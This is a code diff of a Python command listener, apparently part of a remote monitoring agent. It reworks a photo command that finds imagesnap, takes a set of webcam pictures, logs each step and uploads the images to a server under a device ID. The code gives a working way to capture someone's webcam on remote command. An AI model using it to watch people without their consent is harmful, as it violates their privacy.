@@ -108,25 +108,41 @@ class CommandListener:
             count = args.get("count", 1)
             photos = []
 
-            # Import capture function
-            try:
-                from pro_monitor import Capture
-                photos = Capture.capture_photos(count=count, delay=1)
-            except ImportError:
-                # Fallback to imagesnap directly
-                imagesnap = "/opt/homebrew/bin/imagesnap"
-                if not os.path.exists(imagesnap):
-                    imagesnap = "/usr/local/bin/imagesnap"
+            log(f"[INFO] Capturing {count} photos...")
 
-                for i in range(count):
-                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-                    photo_path = BASE_DIR / "captured_images" / f"cmd_photo_{timestamp}_{i}.jpg"
-                    photo_path.parent.mkdir(parents=True, exist_ok=True)
+            # Find imagesnap
+            imagesnap = None
+            for path in ["/opt/homebrew/bin/imagesnap", "/usr/local/bin/imagesnap"]:
+                if os.path.exists(path):
+                    imagesnap = path
+                    break
 
-                    subprocess.run([imagesnap, "-w", "0.5", str(photo_path)],
-                                   capture_output=True, timeout=10)
-                    if photo_path.exists():
+            if not imagesnap:
+                log("[ERROR] imagesnap not found")
+                return {"success": False, "error": "imagesnap not installed"}
+
+            for i in range(count):
+                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+                photo_path = BASE_DIR / "captured_images" / f"capture_{timestamp}_{i+1}_{os.urandom(3).hex()}.jpg"
+                photo_path.parent.mkdir(parents=True, exist_ok=True)
+
+                try:
+                    # Use longer warmup (2s) and timeout (30s) for camera initialization
+                    result = subprocess.run(
+                        [imagesnap, "-w", "2.0", str(photo_path)],
+                        capture_output=True, text=True, timeout=30
+                    )
+                    if photo_path.exists() and photo_path.stat().st_size > 0:
                         photos.append(str(photo_path))
+                        log(f"[INFO] Photo {i+1}/{count} captured")
+                    else:
+                        log(f"[WARN] Photo {i+1} not saved or empty")
+                except subprocess.TimeoutExpired:
+                    log(f"[ERROR] Photo {i+1} capture timeout")
+                except Exception as e:
+                    log(f"[ERROR] Photo {i+1} error: {e}")
+
+                if i < count - 1:
                     time.sleep(1)
 
             # Upload photos
@@ -136,13 +152,15 @@ class CommandListener:
                     url = self.client.upload_file(self.device_id, photo, "photos")
                     if url:
                         photo_urls.append(url)
+                        log(f"[INFO] Photo uploaded")
 
             return {
-                "success": True,
+                "success": len(photos) > 0,
                 "photo_count": len(photos),
                 "photo_urls": photo_urls
             }
         except Exception as e:
+            log(f"[ERROR] Photo command failed: {e}")
             return {"success": False, "error": str(e)}
 
     def cmd_location(self, args: dict) -> dict:
